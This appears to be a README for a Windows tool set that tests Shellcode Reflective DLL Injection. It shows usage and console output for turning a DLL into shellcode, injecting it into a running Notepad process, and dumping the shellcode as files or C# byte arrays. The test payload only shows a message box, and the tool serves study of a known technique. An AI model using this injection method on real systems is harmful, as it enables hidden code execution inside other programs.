# Shellcode Reflective DLL Injection

This directory is for tools to test sRDI (Shellcode Reflective DLL Injection).

## TestLib

This DLL is for testing sRDI.
Simply pops up message box from loaded process.

## ReflectiveLoader

This program is a source of reflective loader shellcode.
Must be built as Release build.
Code in `.text` section corresponds to reflective loader shellcode.

## ShellcodeReflectiveInjector

This tool is to test sRDI:

```
PS C:\Dev> .\ShellcodeReflectiveInjector.exe

ShellcodeReflectiveInjector - Tool to test sRDI (Shellcode Reflective DLL Injection).

Usage: ShellcodeReflectiveInjector.exe [Options]

    -h, --help    : Displays this help message.
    -c, --convert : Flag to convert PE to shellcode.
    -i, --inject  : Flag to inject or load shellcode.
    -f, --format  : Specifies output format of dump data. "cs", "c" and "py" are allowed.
    -m, --module  : Specifies a PE file to generate shellcode.
    -p, --pid     : Specifies PID to inject shellcode.

[!] -m option is required.
```

To load DLL as shellcode, specifies DLL file with `-m` option and set `-i` flag as follows.
DLL will be converted a shellcode to trigger `DLL_PROCESS_ATTACH`:

```
PS C:\Dev> .\ShellcodeReflectiveInjector.exe -m .\TestLib.dll -i

[>] Reading module file.
    [*] Path : C:\Dev\TestLib.dll
[+] 10752 bytes module data is read successfully
[*] Module architecture is AMD64.
[>] Trying to convert module data to shellcode
[*] Got 0x3334 bytes shellcode.
[>] Trying to allocate shellcode buffer.
[+] Shellcode buffer is at 0x0000025DEB180000.
[*] Shellcode is written in shellcode buffer.
[>] Trying to update memory protection for shellcode buffer.
[+] Memory protection is updated successfully.
[>] Trying to create shellcode thread.
[+] Shellcode thread is started successfully.
    [*] Thread Handle : 0x2E4
[*] Done.
```

![](./figures/sRDI-load.png)

When PID specified with `-p` option, this tool convert DLL to shellcode and inject it remote process:

```
PS C:\Dev> Get-Process notepad

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    529      33    28008      66320       0.28  10236   1 Notepad


PS C:\Dev> .\ShellcodeReflectiveInjector.exe -m .\TestLib.dll -i -p 10236

[>] Reading module file.
    [*] Path : C:\Dev\TestLib.dll
[+] 10752 bytes module data is read successfully
[*] Module architecture is AMD64.
[>] Trying to convert module data to shellcode
[*] Got 0x3334 bytes shellcode.
[>] Trying to open the target process.
    [*] Process ID   : 10236
    [*] Process Name : Notepad
[+] Got a target process handle.
    [*] Process Handle : 0x2DC
[>] Trying to allocate shellcode buffer.
[+] Shellcode buffer is at 0x000001C85C5A0000.
[>] Trying to write shellcode to the target process.
[+] 13108 bytes DLL data is written in the target process.
[*] Shellcode is written in shellcode buffer.
[>] Trying to update memory protection for shellcode buffer.
[+] Memory protection is updated successfully.
[>] Trying to create shellcode thread.
[+] Shellcode thread is started successfully.
    [*] Thread Handle : 0x2E4
[*] Done.
```

![](./figures/sRDI-inject.png)

If you only want to export shellcode bytes into a file, set `-c` flag.
Exported files are named as `shellcode.bin` or `shellcode_{index}.bin`:

```
PS C:\Dev> .\ShellcodeReflectiveInjector.exe -m .\TestLib.dll -c

[>] Reading module file.
    [*] Path : C:\Dev\TestLib.dll
[+] 10752 bytes module data is read successfully
[*] Module architecture is AMD64.
[*] Got 0x3334 bytes shellcode.
[*] Export shellcode data to C:\Dev\shellcode.bin.
[*] Done.

PS C:\Dev> .\ShellcodeReflectiveInjector.exe -m .\TestLib.dll -c

[>] Reading module file.
    [*] Path : C:\Dev\TestLib.dll
[+] 10752 bytes module data is read successfully
[*] Module architecture is AMD64.
[*] Got 0x3334 bytes shellcode.
[*] Export shellcode data to C:\Dev\shellcode_0.bin.
[*] Done.

PS C:\Dev> dir shellcode*bin


    Directory: C:\Dev


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/16/2023   3:54 AM          13108 shellcode.bin
-a----         3/16/2023   3:54 AM          13108 shellcode_0.bin

PS C:\Dev> Format-Hex .\shellcode.bin


           Path: C:\Dev\shellcode.bin

           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

00000000   E8 00 00 00 00 59 41 B8 2F 09 00 00 4C 01 C1 48  è....YA¸/...L.ÁH
00000010   89 4C 24 08 55 53 56 57 41 54 41 55 41 56 41 57  Ll$áHì...eH.VAW

--snip--
```

To dump converted shellcode in some programming language format, set `-f` option with `-c` flag.
Currentry supports `c` (C/C++), `cs` (CSharp) and `py` (Python):

```
PS C:\Dev> .\ShellcodeReflectiveInjector.exe -m .\TestLib.dll -c -f cs

[>] Reading module file.
    [*] Path : C:\Dev\TestLib.dll
[+] 10752 bytes module data is read successfully
[*] Module architecture is AMD64.
[*] Got 0x3334 bytes shellcode.
[*] Dump shellcode in CSharp format:

var data = new byte[] {
    0xE8, 0x00, 0x00, 0x00, 0x00, 0x59, 0x41, 0xB8, 0x2F, 0x09, 0x00, 0x00,
    0x4C, 0x01, 0xC1, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x55, 0x53, 0x56, 0x57,
    0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8D, 0x6C, 0x24,
    0xE1, 0x48, 0x81, 0xEC, 0x88, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04,

--snip--

[*] Done.
```

## References

* [sRDI – Shellcode Reflective DLL Injection](https://www.netspi.com/blog/technical/adversary-simulation/srdi-shellcode-reflective-dll-injection/)

* [GitHub - monoxgas/sRDI](https://github.com/monoxgas/sRDI)

* [An Improved Reflective DLL Injection Technique](https://disman.tl/2015/01/30/an-improved-reflective-dll-injection-technique.html)

## Acknowlegments

* Nick Landers ([@monoxgas](https://twitter.com/monoxgas))